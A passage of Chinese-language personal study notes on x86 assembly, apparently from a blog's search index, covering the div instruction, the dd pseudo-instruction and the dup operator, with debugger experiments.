class="line"></span><br><span class="line">* ```</span><br><span class="line">  div word ptr es:[0]</span><br><span class="line">  含义为:</span><br><span class="line">  (ax)=[(dx)*10000H+(ax)]/((ds)*16+0)的商</span><br><span class="line">  (dx)=[(dx)*10000H+(ax)]/((ds)*16+0)的余数</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>div byte ptr [bx+si+8]含义为：(al)=(ax)/((ds)*16+(bx)+(si)+8)的商(ah)=(ax)/((ds)*16+(bx)+(si)+8)的余数<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  div word ptr [bx+si+8]</span><br><span class="line">  含义为：</span><br><span class="line">  (ax)=[(dx)*10000H+(ax)]/((ds)*16+(bx)+(si)+8)的商</span><br><span class="line">  (dx)=[(dx)*10000H+(ax)]/((ds)*16+(bx)+(si)+8)的余数 </span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>除数小于255，可以在一个8位寄存器中存放，但具体要看被除数的大小</p></li></ul><p><strong>试试</strong></p><p><strong>1. 假设我们要计算100001&#x2F;100</strong></p><ol><li>编写程序</li></ol><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240723204009759.png" alt="image-20240723204009759"></p><ol start="2"><li>编译连接，debug调试</li><li>单步调试得到结果</li></ol><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723204239053.png" alt="image-20240723204239053"></p><p><strong>2. 计算1001&#x2F;100</strong></p><p>我们先用bl，表示用使用8位的除数，发现商和余数被储存在ax中</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723204853302.png" alt="image-20240723204853302"></p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240723204841960.png" alt="image-20240723204841960"></p><p>我们在用bx作为除数，表示用16位的除数，发现商和余数分别别储存在ax，dx中</p><p><img src="C:\Users\lkh_2\AppData\Roaming\Typora\typora-user-images\image-20240723204732967.png" alt="image-20240723204732967"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723204752910.png" alt="image-20240723204752910"></p><p>**小结论：**我们发现被除数的位数是由除数决定的</p><h3 id="8-8-伪指令-dd"><a href="#8-8-伪指令-dd" class="headerlink" title="8.8 伪指令 dd"></a>8.8 伪指令 dd</h3><ul><li>我们用db和dw定义字节型数据和字型数据</li><li>dd是用来定义dword（double word双字）型数据的</li></ul><p><strong>上机</strong></p><ol><li><p>编写程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723210226500.png" alt="image-20240723210226500"></p></li><li><p>编译连接，debug调试</p></li><li><p>查看数据段内存</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240723210210190.png" alt="image-20240723210210190"></p></li><li><p>我们发现数据的存入方式不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db 内存单元</span><br><span class="line">dw 低位内存单元：高位内存单元</span><br><span class="line">dd 低低位内存单元：低高位内存单元：高低位内存单元：高高位内存单元//叫法是我编的，知道什么意思就行</span><br></pre></td></tr></table></figure></li></ol><h3 id="8-9-dup"><a href="#8-9-dup" class="headerlink" title="8.9 dup"></a>8.9 dup</h3><ul><li><p>dup是一个操作符，在汇编语言中同db，dw，dd等一样，也是由编译器识别处理的符号</p></li><li><p>它是和db，dw，dd等数据定义伪指令配合使用的，用来进行数据的重复</p></li><li><p>示例：</p><ul><li><pre><code>db 3 dup(0)定义了三个字节，他们的值都是0相当于db 0,0,0<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  db 3 dup(0,1,2)</span><br><span class="line">  定义了九个字节 012012012</span><br><span class="line">  相当于 db 0,1,2,0,1,2,0,1,2</span><br></pre></td></tr></table></figure></code></pre></li><li><pre><code>db 3 dup (&#39;abc&#39;, &#39;ABC&#39;)定义了18个字节，它们是abcABCabcABCabcABC相当于db&#39;abeABCabcARCabcABC&#39;</code></pre></li></ul></li><li><p>dup的使用格式</p><ul><li>db 重复的次数 dup （重复的字节型数据）</li><li>dw 重复的次数 dup （重复的字型数据）</li><li>dd 重复的次数 dup （重复的双字型数据）</li></ul></li><li><p>dup是一个十分有用的操作符，比如我们要定义一个容量为 200 个字节的栈段，只需要 <code>db 200 dup(0)</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 汇编语言学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
